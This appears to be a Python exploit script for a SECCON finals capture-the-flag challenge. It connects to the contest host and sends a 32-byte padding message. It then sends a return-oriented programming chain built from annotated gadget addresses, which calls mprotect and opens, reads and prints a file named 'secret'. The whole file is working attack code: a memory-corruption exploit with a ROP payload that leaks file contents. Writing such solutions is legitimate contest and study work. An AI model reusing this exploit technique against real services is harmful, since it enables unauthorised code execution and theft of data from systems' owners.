import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def send_msg(f, _str):
    f.write(p(len(_str)))
    f.write(_str)


host = '3.finals.seccon.jp'
#host = '192.168.165.216'
port = 20000

material_base = 0x10000000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

'''
.text:000FD539                 pop     esi
.text:000FD53A                 pop     ebx
.text:000FD53B                 pop     edx
.text:000FD53C                 retn
.text:000FD53C sub_FD510       endp
'''

'''
.text:000F37DF                 pop     edx
.text:000F37E0                 pop     ecx
.text:000F37E1                 pop     eax
.text:000F37E2                 retn
'''

'''
.text:000EF791                 int     80h             ; LINUX -
.text:000EF793                 pop     ebp
.text:000EF794                 pop     edi
.text:000EF795                 pop     esi
.text:000EF796                 pop     ebx
.text:000EF797                 retn
.text:000EF797 sub_EF770       endp
'''

'''
.text:0004CAC2                 mov     [edx], eax
.text:0004CAC4
.text:0004CAC4 loc_4CAC4:                              ; CODE XREF: printf_size_info+6j
.text:0004CAC4                 mov     eax, 1
.text:0004CAC9                 retn
'''

dca_ret = 0x100F37DF
a_ret = 0x100F37E1
b_ret = 0x100EF796
d_ret = 0x100FD53B
int80 = 0x100EF791

write_val = 0x1004CAC2
syscall_mprotect = 125
syscall_read = 3
syscall_write = 4
syscall_open = 5

cc_addr = 0x10016f7b

buf_addr = 0x101a3d00

# secret
#rop = p(cc_addr)
rop = p(dca_ret)
rop += p(0x7) # edx type
rop += p(0x1a4000) # ecx len
rop += p(syscall_mprotect) # eax: 125
rop += p(b_ret)
rop += p(0x10000000) # ebx
rop += p(int80)
rop += p(0x41414141) * 4

rop += p(d_ret) # addr
rop += p(0x10000000)
rop += p(a_ret) # val
rop += 'secr'
rop += p(write_val)
rop += p(d_ret) # addr
rop += p(0x10000004)
rop += p(a_ret) # val
rop += 'et\x00\x00'
rop += p(write_val)

rop += p(dca_ret)
rop += p(0x0) # edx
rop += p(0x0) # ecx
rop += p(syscall_open) # eax open
rop += p(b_ret)
rop += p(0x10000000) # ebx
rop += p(int80)
rop += p(0x41414141) * 4

rop += p(dca_ret)
rop += p(1024) # edx
rop += p(buf_addr) # ecx
rop += p(syscall_read) # eax open
rop += p(b_ret)
rop += p(0x0) # ebx
rop += p(int80)
rop += p(0x41414141) * 4

rop += p(dca_ret)
rop += p(256) # edx
rop += p(buf_addr) # ecx
rop += p(syscall_write) # eax open
rop += p(b_ret)
rop += p(0x1) # ebx
rop += p(int80)
rop += p(0x41414141) * 4

raw_input('wait')

send_msg(f, 'a' * 32)
send_msg(f, rop)

print f.read(1024)
print f.read(1024)
print f.read(1024)

'''
t = telnetlib.Telnet()
t.sock = s
t.interact()
'''